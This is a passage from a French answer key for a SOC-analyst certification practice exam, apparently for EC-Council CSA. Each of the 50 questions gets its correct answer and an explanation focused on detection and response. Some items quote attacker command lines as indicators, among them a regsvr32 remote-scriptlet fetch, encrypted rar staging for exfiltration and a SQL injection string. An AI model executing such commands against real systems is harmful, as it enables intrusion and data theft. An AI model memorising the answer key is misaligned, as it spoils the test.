| 02 | **D** | Incident Response | Intermédiaire |
| 03 | **A** | Endpoint Security | Intermédiaire |
| 04 | **B** | Attack Techniques | Intermédiaire |
| 05 | **D** | Network Security Monitoring | Fondamental |
| 06 | **B** | Cloud Security | Avancé / Expert |
| 07 | **A** | Detection Engineering | Avancé / Expert |
| 08 | **C** | Attack Techniques | Fondamental |
| 09 | **A** | Endpoint Security | Fondamental |
| 10 | **C** | SIEM | Fondamental |
| 11 | **B** | Endpoint Security | Intermédiaire |
| 12 | **D** | Endpoint Security | Intermédiaire |
| 13 | **B** | Incident Response | Intermédiaire |
| 14 | **D** | Incident Response | Avancé / Expert |
| 15 | **A** | Endpoint Security | Avancé / Expert |
| 16 | **C** | Attack Techniques | Avancé / Expert |
| 17 | **D** | Vulnerability Management | Intermédiaire |
| 18 | **A** | Endpoint Security | Fondamental |
| 19 | **C** | SOC Fundamentals | Fondamental |
| 20 | **B** | Endpoint Security | Intermédiaire |
| 21 | **D** | Attack Techniques | Avancé / Expert |
| 22 | **A** | Digital Forensics | Fondamental |
| 23 | **B** | Network Security Monitoring | Avancé / Expert |
| 24 | **C** | Threat Intelligence | Fondamental |
| 25 | **A** | Endpoint Security | Intermédiaire |
| 26 | **C** | SIEM | Fondamental |
| 27 | **D** | Threat Intelligence | Intermédiaire |
| 28 | **B** | Attack Techniques | Avancé / Expert |
| 29 | **B** | Endpoint Security | Intermédiaire |
| 30 | **D** | Attack Techniques | Intermédiaire |
| 31 | **A** | SOC Fundamentals | Fondamental |
| 32 | **C** | Threat Intelligence | Intermédiaire |
| 33 | **B** | SIEM | Intermédiaire |
| 34 | **C** | Attack Techniques | Intermédiaire |
| 35 | **D** | SOC Fundamentals | Fondamental |
| 36 | **A** | SIEM | Intermédiaire |
| 37 | **D** | SIEM | Intermédiaire |
| 38 | **B** | Digital Forensics | Avancé / Expert |
| 39 | **A** | Endpoint Security | Intermédiaire |
| 40 | **C** | Attack Techniques | Avancé / Expert |
| 41 | **D** | Detection Engineering | Avancé / Expert |
| 42 | **A** | Vulnerability Management | Fondamental |
| 43 | **C** | Attack Techniques | Avancé / Expert |
| 44 | **B** | Cloud Security | Intermédiaire |
| 45 | **D** | Network Security Monitoring | Intermédiaire |
| 46 | **B** | Threat Hunting | Avancé / Expert |
| 47 | **A** | Endpoint Security | Fondamental |
| 48 | **C** | Threat Intelligence | Fondamental |
| 49 | **D** | Threat Hunting | Intermédiaire |
| 50 | **C** | Malware Analysis | Fondamental |

### Corrigé – Question 01

Une alerte de proxy mentionne l'IP interne 10.20.30.45 il y a trois jours. Quelle source permet de déterminer avec certitude quel poste utilisait cette IP à ce moment ?

**Réponse correcte : C** — Les journaux DHCP (baux attribués), corrélés avec les journaux d'authentification ou l'inventaire EDR.

> **Explication technique :** Dans un réseau DHCP, une IP peut être réattribuée. Seuls les journaux de baux horodatés permettent d'associer l'IP au poste (adresse MAC, nom d'hôte) à l'instant de l'alerte. Les informations actuelles peuvent conduire à investiguer le mauvais poste.
>
> *Compétence évaluée : Incident Response / Corrélation IP-hôte.*

### Corrigé – Question 02

Quel est le rôle de l'investigation et réponse automatisées (AIR) de Microsoft Defender XDR ?

**Réponse correcte : D** — Examiner automatiquement alertes et entités, puis proposer ou appliquer la remédiation selon la configuration.

> **Explication technique :** AIR analyse les preuves (fichiers, processus, e-mails, persistance) et détermine un verdict. Selon le niveau d'automatisation, les remédiations sont appliquées automatiquement ou attendent une approbation dans l'Action center, ce qui réduit la charge des analystes.
>
> *Compétence évaluée : Incident Response / Defender AIR.*

### Corrigé – Question 03

Que signale l'Event ID 4648 ?

**Réponse correcte : A** — Une connexion avec des identifiants explicites (ex. runas ou accès distant sous un autre compte).

> **Explication technique :** L'Event ID 4648 est généré sur la machine source lorsqu'un processus utilise des identifiants différents de ceux de la session. Il est utile pour détecter le mouvement latéral et l'usage d'identifiants volés, en identifiant le compte cible et le serveur visé.
>
> *Compétence évaluée : Endpoint Security / Identifiants explicites.*

### Corrigé – Question 04

Des employés d'un même secteur sont infectés après avoir visité le site légitime d'une association professionnelle compromise. Quelle technique est utilisée ?

**Réponse correcte : B** — Une attaque de point d'eau (watering hole).

> **Explication technique :** L'attaquant compromet un site fréquenté par ses cibles pour y injecter du code malveillant (exploit de navigateur, faux téléchargement). La détection repose sur les journaux proxy, la télémétrie EDR du navigateur et le partage de renseignements sectoriels.
>
> *Compétence évaluée : Attack Techniques / Watering hole.*

### Corrigé – Question 05

Quel port est utilisé par défaut par LDAP sécurisé par TLS (LDAPS) ?

**Réponse correcte : D** — TCP 636.

> **Explication technique :** LDAPS utilise TCP 636, LDAP en clair TCP/UDP 389, Kerberos le port 88 et SMB le port 445. La connaissance des ports associés aux services d'annuaire aide à interpréter les flux vers les contrôleurs de domaine.
>
> *Compétence évaluée : Network Security Monitoring / Ports.*

### Corrigé – Question 06

CloudTrail enregistre un événement ConsoleLogin réussi du compte root AWS à 3 h du matin, depuis une IP inconnue, suivi de la création d'utilisateurs IAM. Quelle évaluation est la plus juste ?

**Réponse correcte : B** — Un incident critique : usage anormal du root et persistance probable via IAM ; confinement immédiat.

> **Explication technique :** Les bonnes pratiques AWS réservent le compte root à de rares tâches et exigent le MFA. Une connexion inattendue suivie de la création d'identités (T1136.003) indique une compromission grave. Il faut sécuriser le root (mot de passe, MFA), supprimer les identités créées et examiner toutes les actions CloudTrail.
>
> *Compétence évaluée : Cloud Security / AWS root.*

### Corrigé – Question 07

Lors d'un exercice purple team, la technique T1003.001 est exécutée : l'EDR la bloque, mais aucune alerte n'apparaît dans le SIEM. Quelle est la conclusion la plus pertinente ?

**Réponse correcte : A** — Une lacune d'intégration : la télémétrie EDR ne remonte pas au SIEM ; corriger puis retester.

> **Explication technique :** Une prévention réussie ne garantit pas la visibilité du SOC. Sans alerte centralisée, la tentative serait passée inaperçue, alors qu'elle révèle un attaquant actif. L'exercice met en évidence un défaut de connecteur, de règle ou de mapping, à corriger et à valider par un nouveau test.
>
> *Compétence évaluée : Detection Engineering / Purple team.*

### Corrigé – Question 08

Quel est le rôle de l'enregistrement SPF d'un domaine ?

**Réponse correcte : C** — Indiquer quels serveurs sont autorisés à envoyer des e-mails pour ce domaine.

> **Explication technique :** SPF (Sender Policy Framework), publié dans un enregistrement TXT, liste les IP ou serveurs autorisés à émettre pour le domaine de l'enveloppe (MAIL FROM). DKIM signe les messages, DMARC définit la politique d'alignement et l'enregistrement MX désigne les serveurs de réception.
>
> *Compétence évaluée : Attack Techniques / Messagerie.*

### Corrigé – Question 09

Quel Event ID, enregistré sur le contrôleur de domaine, signale le verrouillage d'un compte utilisateur ?

**Réponse correcte : A** — 4740.

> **Explication technique :** L'Event ID 4740 (« A user account was locked out ») indique le nom du compte et l'ordinateur à l'origine des échecs (Caller Computer Name). Une vague de verrouillages peut révéler un brute force, mais aussi un ancien mot de passe enregistré sur un appareil.
>
> *Compétence évaluée : Endpoint Security / Verrouillage.*

### Corrigé – Question 10

En gestion des journaux, que désigne le parsing ?

**Réponse correcte : C** — L'extraction de champs structurés (date, IP, utilisateur) depuis le message brut.

> **Explication technique :** Le parsing découpe un message brut en champs structurés exploitables. Sans parsing correct, les recherches, les règles de corrélation et les tableaux de bord ne fonctionnent pas. Il précède généralement la normalisation vers un schéma commun.
>
> *Compétence évaluée : SIEM / Parsing.*

### Corrigé – Question 11

Lors de l'investigation d'un serveur Linux compromis, quels emplacements vérifier en priorité pour la persistance ?

**Réponse correcte : B** — Les crontabs, les services systemd, le fichier ~/.ssh/authorized_keys et les scripts de démarrage du shell (.bashrc).

> **Explication technique :** Les mécanismes de persistance Linux courants incluent cron (T1053.003), les services systemd (T1543.002), l'ajout de clés SSH (T1098.004) et la modification des fichiers d'initialisation du shell (T1546.004). Les dates de modification et le contenu de ces fichiers doivent être comparés à une référence.
>
> *Compétence évaluée : Endpoint Security / Persistance Linux.*

### Corrigé – Question 12

Quel Event ID du journal Security signale la création d'une tâche planifiée lorsque l'audit des objets est activé ?

**Réponse correcte : D** — 4698.

> **Explication technique :** L'Event ID 4698 (« A scheduled task was created ») contient le XML de la tâche, notamment la commande exécutée et le déclencheur. 4699 indique une suppression et 4702 une modification. 5140 trace l'accès à un partage réseau.
>
> *Compétence évaluée : Endpoint Security / Tâches planifiées.*

### Corrigé – Question 13

Un employé démissionnaire copie 12 Go de fichiers clients sur une clé USB la veille de son départ. Quelles sources permettent de confirmer et documenter les faits ?

**Réponse correcte : B** — Les journaux DLP et EDR (USB, fichiers), corrélés avec les accès aux partages de fichiers.

> **Explication technique :** Les solutions DLP et EDR tracent le branchement de périphériques USB et les copies de fichiers. Les journaux d'accès aux fichiers (Event ID 5145 pour les partages, audit SharePoint) complètent la chronologie. Ces investigations impliquent les RH et le juridique et doivent respecter le cadre légal.
>
> *Compétence évaluée : Incident Response / Menace interne.*

### Corrigé – Question 14

L'EDR détecte l'exécution de rar.exe a -hp[motdepasse] C:\Users\Public\data.rar sur un serveur de fichiers, avec des centaines de fichiers de projets. Quelle tactique est observée et quelle action prioriser ?

**Réponse correcte : D** — La préparation d'une exfiltration (T1560.001) ; surveiller les flux sortants et identifier le compte utilisé.

> **Explication technique :** L'archivage chiffré de données dans un répertoire public est un indicateur de « staging » avant exfiltration (Collection, TA0009). L'option -hp chiffre aussi les noms de fichiers. Intervenir à ce stade peut empêcher la fuite : surveillance réseau, blocage, investigation du compte utilisé.
>
> *Compétence évaluée : Incident Response / Préparation de l'exfiltration.*

### Corrigé – Question 15

Sysmon Event ID 17 montre la création d'un named pipe nommé \MSSE-1234-server par un processus lancé depuis un répertoire temporaire. Quelle hypothèse privilégier ?

**Réponse correcte : A** — L'utilisation probable d'une balise Cobalt Strike avec une configuration par défaut, ce nom de pipe faisant partie de ses artefacts connus.

> **Explication technique :** Les Event IDs Sysmon 17 et 18 tracent la création et la connexion aux named pipes. Cobalt Strike utilise par défaut des noms caractéristiques (ex. MSSE-<nombre>-server). Les attaquants avancés les modifient, mais la combinaison avec un processus lancé depuis un répertoire temporaire reste un indicateur fort.
>
> *Compétence évaluée : Endpoint Security / Named pipes.*

### Corrigé – Question 16

Quel processus parent, sur la machine cible, indique l'exécution de commandes via PowerShell Remoting (WinRM) ?

**Réponse correcte : C** — wsmprovhost.exe.

> **Explication technique :** Les sessions PowerShell Remoting sont hébergées par wsmprovhost.exe sur la cible, avec une connexion entrante sur les ports 5985 (HTTP) ou 5986 (HTTPS). Des processus enfants inhabituels de wsmprovhost.exe et des événements du journal Microsoft-Windows-WinRM/Operational signalent un usage à investiguer (T1021.006).
>
> *Compétence évaluée : Attack Techniques / WinRM.*

### Corrigé – Question 17

Dans un vecteur CVSS v3.1, que signifient les métriques AV:N/PR:N/UI:N ?

**Réponse correcte : D** — La vulnérabilité est exploitable à distance par le réseau, sans privilège préalable et sans interaction de l'utilisateur.

> **Explication technique :** AV (Attack Vector) : N pour Network ; PR (Privileges Required) : N pour None ; UI (User Interaction) : N pour None. Cette combinaison caractérise les vulnérabilités les plus dangereuses, souvent exploitables par des vers ou des scans de masse.
>
> *Compétence évaluée : Vulnerability Management / Vecteur CVSS.*

### Corrigé – Question 18

Quel Event ID indique qu'un membre a été ajouté à un groupe de sécurité global, comme « Domain Admins » ?

**Réponse correcte : A** — 4728.

> **Explication technique :** L'Event ID 4728 trace l'ajout à un groupe global de sécurité (4732 pour un groupe local, 4756 pour un groupe universel). L'ajout d'un compte aux groupes à privilèges doit générer une alerte immédiate, car c'est une technique fréquente d'élévation et de persistance (T1098).
>
> *Compétence évaluée : Endpoint Security / Groupes privilégiés.*

### Corrigé – Question 19

Quel principe consiste à n'accorder aux utilisateurs que les droits strictement nécessaires à leurs missions ?

**Réponse correcte : C** — Le principe du moindre privilège.

> **Explication technique :** Le moindre privilège limite l'impact d'une compromission de compte. Il se met en œuvre par des rôles adaptés, la suppression des droits administrateurs locaux, l'accès just-in-time (PIM) et des revues régulières des habilitations.
>
> *Compétence évaluée : SOC Fundamentals / Moindre privilège.*

### Corrigé – Question 20

L'EDR signale mshta.exe lancé par explorer.exe avec une URL distante en argument, suivi d'une connexion réseau sortante. Quelle est la meilleure interprétation ?

**Réponse correcte : B** — Une exécution probable d'une application HTA malveillante via un binaire système (T1218.005), souvent liée à un lien de phishing ou à un fichier LNK.

> **Explication technique :** Mshta exécute des fichiers HTML Application pouvant contenir du VBScript ou du JScript. Son utilisation avec une URL distante est rarement légitime dans un environnement d'entreprise. L'analyse du fichier HTA et de la chaîne d'exécution est nécessaire.
>
> *Compétence évaluée : Endpoint Security / MSHTA.*

### Corrigé – Question 21

Sur un serveur, l'EDR montre wmiprvse.exe lançant powershell.exe avec une commande encodée, peu après un logon type 3 d'un compte administrateur depuis un autre poste. Quelle conclusion est la plus pertinente ?

**Réponse correcte : D** — Une exécution à distance via WMI (T1047), par exemple avec wmic /node: process call create, utilisée pour le mouvement latéral.

> **Explication technique :** Lorsque WMI est utilisé à distance, la commande s'exécute comme processus enfant de WmiPrvSE.exe sur la cible. Combiné à une authentification réseau préalable et à un PowerShell encodé, cela caractérise un mouvement latéral. Il faut analyser le poste source, qui détient probablement des identifiants compromis.
>
> *Compétence évaluée : Attack Techniques / WMI à distance.*

### Corrigé – Question 22

Pourquoi calcule-t-on le hash SHA-256 d'une image disque au moment de son acquisition ?

**Réponse correcte : A** — Pour pouvoir prouver ultérieurement que l'image n'a pas été modifiée.

> **Explication technique :** Le hash est une empreinte unique : toute modification d'un seul bit produit un hash différent. Le comparer à chaque étape de la chaîne de possession démontre l'intégrité de la preuve. L'acquisition se fait idéalement avec un bloqueur d'écriture.
>
> *Compétence évaluée : Digital Forensics / Intégrité.*

### Corrigé – Question 23

Le SOC constate que plusieurs postes n'émettent plus de requêtes vers les serveurs DNS internes, mais établissent des connexions HTTPS vers des résolveurs publics (ex. sur le port 443). Quel risque cela représente-t-il ?

**Réponse correcte : B** — Le DoH contourne la surveillance et le filtrage DNS internes, et peut masquer des communications C2.

> **Explication technique :** Le DoH encapsule les requêtes DNS dans HTTPS, ce qui les rend invisibles aux journaux DNS internes et aux protections de type DNS firewall. Les politiques d'entreprise désactivent généralement le DoH non autorisé dans les navigateurs et bloquent les résolveurs DoH publics connus.
>
> *Compétence évaluée : Network Security Monitoring / DNS chiffré.*

### Corrigé – Question 24

Dans MITRE ATT&CK, que représente une « tactique » ?

**Réponse correcte : C** — L'objectif de l'attaquant à une étape de l'attaque (le « pourquoi »), comme la persistance ou l'exfiltration.

> **Explication technique :** Les tactiques (TA00xx) décrivent les objectifs, les techniques (Txxxx) la manière de les atteindre (le « comment ») et les sous-techniques un niveau de détail supplémentaire. Les procédures décrivent les mises en œuvre concrètes observées chez des acteurs.
>
> *Compétence évaluée : Threat Intelligence / MITRE ATT&CK.*

### Corrigé – Question 25

Un analyste veut savoir quel processus a résolu un domaine C2 sur un poste. Quel événement Sysmon fournit cette information ?

**Réponse correcte : A** — Event ID 22 (DNSEvent), qui associe la requête DNS au processus émetteur.

> **Explication technique :** Les journaux du serveur DNS montrent l'hôte, mais pas le processus. Sysmon 22 enregistre la requête, le résultat et l'image du processus, ce qui permet d'identifier immédiatement l'exécutable malveillant à l'origine de la résolution.
>
> *Compétence évaluée : Endpoint Security / Sysmon DNS.*

### Corrigé – Question 26

Dans IBM QRadar, que signifie l'indicateur EPS, souvent utilisé pour le dimensionnement et les licences ?

**Réponse correcte : C** — Events Per Second : le nombre d'événements traités par seconde.

> **Explication technique :** L'EPS mesure le débit d'événements ingérés. Il sert au dimensionnement de l'infrastructure et à la licence QRadar, avec les FPM (Flows Per Minute) pour les flux réseau. Un dépassement peut entraîner la mise en file d'attente ou la perte d'événements.
>
> *Compétence évaluée : SIEM / QRadar.*

### Corrigé – Question 27

Un analyste souhaite examiner une URL suspecte sans la visiter depuis son poste. Quel service est adapté ?

**Réponse correcte : D** — urlscan.io, qui visite l'URL et fournit captures d'écran, requêtes, redirections et indicateurs associés.

> **Explication technique :** urlscan.io (ou une sandbox navigateur) analyse une page à distance : contenu, ressources chargées, domaines contactés, certificats. Attention : les scans publics sont visibles par tous ; il faut utiliser le mode privé pour les URL sensibles contenant des identifiants ou des jetons.
>
> *Compétence évaluée : Threat Intelligence / Analyse d'URL.*

### Corrigé – Question 28

Le contrôleur de domaine enregistre de nombreux événements 4771 avec le code d'échec 0x18 pour des centaines de comptes différents depuis un même poste, en quelques minutes. Que conclure ?

**Réponse correcte : B** — Un password spraying via Kerberos (échecs de pré-authentification dus à de mauvais mots de passe), qui ne génère pas nécessairement d'événements 4625.

> **Explication technique :** Le code 0x18 de l'événement 4771 signifie « mot de passe incorrect » lors de la pré-authentification Kerberos. Des outils comme Kerbrute utilisent cette méthode. Une surveillance limitée aux 4625 manquerait ce spraying ; il faut agréger les 4771 par source.
>
> *Compétence évaluée : Attack Techniques / Kerberos.*

### Corrigé – Question 29

Sur un serveur Linux Debian/Ubuntu, quel fichier consulter pour analyser les tentatives de connexion SSH échouées ?

**Réponse correcte : B** — /var/log/auth.log

> **Explication technique :** Sur les distributions Debian/Ubuntu, les authentifications sont journalisées dans /var/log/auth.log (sur RHEL/CentOS, /var/log/secure). Des messages « Failed password for invalid user » répétés indiquent un brute force SSH. Avec systemd, journalctl -u ssh fournit aussi ces informations.
>
> *Compétence évaluée : Endpoint Security / Linux SSH.*

### Corrigé – Question 30

Un e-mail semblant provenir du directeur financier demande un virement urgent ; le champ Reply-To pointe vers une adresse externe différente. Quelle menace est la plus probable ?

**Réponse correcte : D** — Une fraude de type Business Email Compromise (BEC) par usurpation ou compte compromis.

> **Explication technique :** Le BEC exploite l'ingénierie sociale pour obtenir des virements frauduleux, souvent sans pièce jointe ni lien. La divergence entre l'expéditeur affiché et le Reply-To, l'urgence et la demande financière sont des signaux classiques. Une vérification par un canal indépendant est indispensable.
>
> *Compétence évaluée : Attack Techniques / BEC.*

### Corrigé – Question 31

Quelle responsabilité incombe principalement au SOC Manager ?

**Réponse correcte : A** — Piloter l'équipe, les processus, les indicateurs de performance et la relation avec la direction et les métiers.

> **Explication technique :** Le SOC Manager gère les ressources humaines (planning, recrutement, formation), les processus, le reporting, le budget, et représente le SOC auprès du RSSI et de la direction. Il intervient aussi dans la coordination des incidents majeurs.
>
> *Compétence évaluée : SOC Fundamentals / SOC Manager.*

### Corrigé – Question 32

Que signifie le sinkholing d'un domaine malveillant ?

**Réponse correcte : C** — Rediriger la résolution du domaine vers un serveur contrôlé par les défenseurs afin de neutraliser le C2 et d'identifier les machines infectées.

> **Explication technique :** Le sinkhole peut être interne (DNS d'entreprise renvoyant une IP contrôlée) ou mené par des chercheurs et les autorités. Les postes qui contactent l'IP du sinkhole sont identifiés comme infectés. Il est aussi utilisé contre les malwares à DGA.
>
> *Compétence évaluée : Threat Intelligence / Sinkhole.*

### Corrigé – Question 33

Pourquoi utiliser la commande tstats sur des data models accélérés dans Splunk Enterprise Security ?

**Réponse correcte : B** — Pour interroger des résumés indexés pré-calculés, ce qui accélère fortement les recherches sur de grands volumes normalisés selon le CIM.

> **Explication technique :** tstats exploite les données tsidx des data models accélérés. Les recherches de corrélation d'Enterprise Security reposent largement sur ce mécanisme, ce qui suppose que les données soient correctement mappées sur le CIM.
>
> *Compétence évaluée : SIEM / Splunk data models.*

### Corrigé – Question 34

Quelle mesure de protection native de Windows empêche Mimikatz (sekurlsa::logonpasswords) d'extraire les secrets NTLM et Kerberos depuis LSASS ?

**Réponse correcte : C** — Credential Guard, qui isole ces secrets grâce à la virtualisation (VBS).

> **Explication technique :** Credential Guard utilise la sécurité basée sur la virtualisation (VBS) pour isoler les secrets dans le processus LSAIso. La protection LSA (RunAsPPL) complète ce dispositif en empêchant les processus non protégés d'accéder à LSASS.
>
> *Compétence évaluée : Attack Techniques / Mimikatz.*

### Corrigé – Question 35

Une attaque DDoS rendant le site web de l'entreprise inaccessible porte principalement atteinte à quel critère de sécurité ?

**Réponse correcte : D** — La disponibilité.

> **Explication technique :** Le déni de service vise à empêcher l'accès légitime à un service : c'est une atteinte à la disponibilité. Une fuite de données touche la confidentialité et une modification non autorisée l'intégrité.
>
> *Compétence évaluée : SOC Fundamentals / Triade CIA.*

### Corrigé – Question 36

Quand privilégier une règle NRT (Near-Real-Time) dans Microsoft Sentinel plutôt qu'une règle planifiée ?

**Réponse correcte : A** — Pour des détections critiques et simples à déclencher au plus vite (exécution environ chaque minute).

> **Explication technique :** Les règles NRT s'exécutent environ chaque minute et sont adaptées aux événements à haut risque (ajout à un rôle privilégié, connexion d'un compte break-glass). Elles comportent des limitations par rapport aux règles planifiées, qui restent adaptées aux corrélations sur de longues périodes.
>
> *Compétence évaluée : SIEM / Règles NRT.*

### Corrigé – Question 37

Dans Microsoft Sentinel, quel est le rôle des règles d'automatisation (automation rules) ?

**Réponse correcte : D** — Automatiser le tri des incidents : attribution, statut, sévérité, tags et lancement de playbooks.

> **Explication technique :** Les automation rules s'exécutent lors de la création ou de la mise à jour d'incidents et peuvent appeler des playbooks Logic Apps. Elles permettent par exemple de fermer automatiquement des faux positifs connus ou d'assigner les incidents critiques à une équipe.
>
> *Compétence évaluée : SIEM / Automation rules Sentinel.*

### Corrigé – Question 38

Lors de l'analyse de la MFT NTFS, un fichier présente une date de création $STANDARD_INFORMATION en 2019, mais une date $FILE_NAME de la semaine dernière. Que suspecter ?

**Réponse correcte : B** — Un timestomping : l'attaquant a modifié les horodatages $SI pour faire paraître le fichier ancien.

> **Explication technique :** Les horodatages $SI sont modifiables via les API utilisateur, alors que les attributs $FILE_NAME le sont beaucoup plus difficilement. Une incohérence où $SI est antérieur à $FN est un indicateur classique de timestomping (T1070.006). Le journal USN et la timeline globale aident à confirmer.
>
> *Compétence évaluée : Digital Forensics / Timestomping.*

### Corrigé – Question 39

Un analyste observe : regsvr32.exe /s /n /u /i:http://203.0.113.9/file.sct scrobj.dll. De quelle technique s'agit-il ?

**Réponse correcte : A** — Une exécution par proxy d'un binaire système signé (Squiblydoo, T1218.010) pour charger un scriptlet distant en contournant le contrôle applicatif.

> **Explication technique :** Regsvr32 peut charger un scriptlet COM (.sct) distant via scrobj.dll. Cette technique contourne certaines politiques AppLocker, car le binaire est signé par Microsoft. Une ligne de commande contenant /i:http est un indicateur à haute fidélité.
>
> *Compétence évaluée : Endpoint Security / Regsvr32.*

### Corrigé – Question 40

Un analyste découvre des événements 4768 avec un type de pré-authentification égal à 0 pour plusieurs comptes. Quelle attaque cela peut-il révéler et quelle remédiation appliquer ?

**Réponse correcte : C** — Un AS-REP Roasting ; il faut réactiver la pré-authentification Kerberos et renforcer ces mots de passe.

> **Explication technique :** Lorsque l'option « Do not require Kerberos preauthentication » est activée, un attaquant peut obtenir une réponse AS-REP chiffrée avec la clé dérivée du mot de passe et la casser hors ligne (T1558.004). L'inventaire de ces comptes et la suppression de l'option sont les principales remédiations.
>
> *Compétence évaluée : Attack Techniques / AS-REP Roasting.*

### Corrigé – Question 41

Pourquoi recommande-t-on d'utiliser l'opérateur has plutôt que contains dans les requêtes KQL de Microsoft Sentinel lorsque c'est possible ?

**Réponse correcte : D** — Parce que has s'appuie sur l'index des termes entiers, bien plus rapide que la recherche de sous-chaînes.

> **Explication technique :** L'opérateur has exploite l'indexation par termes (tokens d'au moins trois caractères), alors que contains analyse les sous-chaînes. Pour des requêtes exécutées fréquemment ou sur de gros volumes, ce choix améliore nettement les performances, à condition que la recherche porte sur des termes complets.
>
> *Compétence évaluée : Detection Engineering / Performance KQL.*

### Corrigé – Question 42

Qu'est-ce qu'une vulnérabilité zero-day ?

**Réponse correcte : A** — Une vulnérabilité inconnue de l'éditeur ou pour laquelle aucun correctif n'est encore disponible au moment de son exploitation.

> **Explication technique :** Une zero-day est exploitée avant qu'un correctif ne soit disponible. Les détections comportementales et les mesures de défense en profondeur sont alors essentielles, car les signatures et la gestion des correctifs ne protègent pas encore.
>
> *Compétence évaluée : Vulnerability Management / Zero-day.*

### Corrigé – Question 43

Les journaux d'un serveur web montrent des requêtes avec « UNION SELECT username,password FROM users-- » sur un paramètre id, avec des codes 200 et des tailles de réponse nettement supérieures à la normale. Quelle conclusion est la plus solide ?

**Réponse correcte : C** — Une injection SQL probablement réussie, à confirmer côté base de données et à traiter comme une fuite.

> **Explication technique :** Le code 200 indique que l'application a traité la requête ; une taille de réponse anormale suggère que des données supplémentaires ont été renvoyées. Il faut confirmer avec les journaux applicatifs et SQL, identifier les données exposées, corriger le code (requêtes paramétrées) et évaluer les obligations de notification.
>
> *Compétence évaluée : Attack Techniques / Injection SQL.*

### Corrigé – Question 44

Après la compromission d'un compte Microsoft 365, quel artefact l'analyste doit-il vérifier en priorité dans le journal d'audit (OfficeActivity) ?

**Réponse correcte : B** — La création de règles de boîte de réception (New-InboxRule, Set-InboxRule) transférant ou supprimant des e-mails.

> **Explication technique :** Les attaquants créent des règles pour transférer les e-mails vers l'extérieur ou masquer les réponses (T1114.003, T1564.008). Ces règles permettent la persistance de l'espionnage et la fraude BEC même après réinitialisation du mot de passe.
>
> *Compétence évaluée : Cloud Security / Règles de boîte aux lettres.*

### Corrigé – Question 45

Quel filtre Wireshark permet d'afficher les Client Hello TLS indiquant un nom de serveur spécifique ?

**Réponse correcte : D** — tls.handshake.extensions_server_name == "exemple.com"

> **Explication technique :** Le SNI (Server Name Indication) est transmis en clair dans le Client Hello, y compris en TLS 1.3 sans ECH. Le filtre tls.handshake.extensions_server_name permet d'identifier les destinations HTTPS sans déchiffrement. L'en-tête HTTP Host n'est pas visible dans une session chiffrée.
>
> *Compétence évaluée : Network Security Monitoring / Wireshark TLS.*

### Corrigé – Question 46

Une mise à jour signée d'un logiciel de supervision légitime se met à contacter un domaine inconnu après une période de dormance de deux semaines. Quelle approche de détection est la plus efficace dans ce type d'attaque de la chaîne d'approvisionnement ?

**Réponse correcte : B** — La détection comportementale : nouvelles destinations, processus enfants inhabituels, écarts à la baseline.

> **Explication technique :** Dans une compromission de la chaîne d'approvisionnement (T1195.002), le code malveillant est signé par l'éditeur légitime. Seule l'analyse comportementale par rapport à une baseline permet de repérer l'anomalie. Le cas SUNBURST a montré l'importance de surveiller les communications des outils d'administration.
>
> *Compétence évaluée : Threat Hunting / Supply chain.*

### Corrigé – Question 47

Quel Event ID Windows indique la création d'un nouveau compte utilisateur ?

**Réponse correcte : A** — 4720.

> **Explication technique :** L'Event ID 4720 (« A user account was created ») permet de détecter la création de comptes, technique de persistance (T1136). Il faut vérifier qui a créé le compte, depuis quel hôte et si la création suit le processus d'approvisionnement normal. 4625 est un échec de connexion, 4769 une demande de ticket de service Kerberos et 7045 une installation de service.
>
> *Compétence évaluée : Endpoint Security / Gestion des comptes.*

### Corrigé – Question 48

Quel est l'objectif d'un honeypot déployé dans le réseau interne ?

**Réponse correcte : C** — Attirer et détecter les attaquants, car toute interaction avec ce leurre est par nature suspecte.

> **Explication technique :** Un honeypot n'a aucun usage légitime : toute connexion constitue un signal de haute fidélité (scan, mouvement latéral). Il permet aussi d'étudier les techniques de l'attaquant. Il doit être isolé pour ne pas servir de point de rebond.
>
> *Compétence évaluée : Threat Intelligence / Honeypot.*

### Corrigé – Question 49

Le SOC crée dans l'AD un compte « svc_backup_admin » jamais utilisé, avec un SPN fictif. Quel est l'objectif ?

**Réponse correcte : D** — Servir de honeytoken : toute demande de ticket sur ce compte trahit une reconnaissance ou un Kerberoasting.

> **Explication technique :** Un compte leurre n'a aucun usage légitime : un événement 4769 le concernant ou une tentative de connexion constitue une alerte quasi exempte de faux positifs. Les honeytokens (comptes, fichiers, clés API) sont des détections à très faible coût.
>
> *Compétence évaluée : Threat Hunting / Honeytokens.*

### Corrigé – Question 50

Qu'est-ce qu'une sandbox dans le contexte de l'analyse de malware ?

**Réponse correcte : C** — Un environnement isolé et instrumenté où exécuter un fichier suspect pour observer son comportement.

> **Explication technique :** Une sandbox (ex. Any.Run, Joe Sandbox, Cuckoo/CAPE) exécute l'échantillon et enregistre ses actions : processus, fichiers, registre, réseau. Certains malwares détectent les environnements virtualisés et modifient leur comportement, ce qui impose une interprétation prudente.
>
> *Compétence évaluée : Malware Analysis / Sandbox.*

## Bibliographie

- EC-Council – Certified SOC Analyst (page officielle du programme) — <https://www.eccouncil.org/train-certify/certified-soc-analyst-csa/>
- EC-Council – Brochure CSA (2025) — <https://pitman.eccouncil.org/wp-content/uploads/2025/01/CSA-Brochure.pdf>
- EC-Council – CSA v1 Exam Blueprint (version historique) — <https://cert.eccouncil.org/images/doc/CSAv1-Exam-Blueprint.pdf>
- Fast Lane – Plan de cours EC-Council CSA (8 modules) — <https://www.flane.co.uk/course-outline/ec-csa>
- A Guide to Cloud – Fiche examen 312-39 CSA v2 (domaines et pondérations) — <https://www.aguidetocloud.com/cert-tracker/eccouncil-csa/>
- MITRE ATT&CK – Enterprise Matrix — <https://attack.mitre.org/>
- NIST SP 800-61 Rev. 2 – Computer Security Incident Handling Guide — <https://csrc.nist.gov/pubs/sp/800/61/r2/final>
- NIST SP 800-61 Rev. 3 – Incident Response Recommendations (CSF 2.0) — <https://csrc.nist.gov/pubs/sp/800/61/r3/final>
- NIST Cybersecurity Framework 2.0 — <https://www.nist.gov/cyberframework>
- RFC 3227 – Guidelines for Evidence Collection and Archiving — <https://www.rfc-editor.org/rfc/rfc3227>
- RFC 5424 – The Syslog Protocol — <https://www.rfc-editor.org/rfc/rfc5424>
- FIRST – Traffic Light Protocol 2.0 — <https://www.first.org/tlp/>
- FIRST – CVSS v3.1 et v4.0 — <https://www.first.org/cvss/>
- FIRST – EPSS — <https://www.first.org/epss/>
- CISA – Known Exploited Vulnerabilities Catalog — <https://www.cisa.gov/known-exploited-vulnerabilities-catalog>
- OASIS – STIX / TAXII — <https://oasis-open.github.io/cti-documentation/>
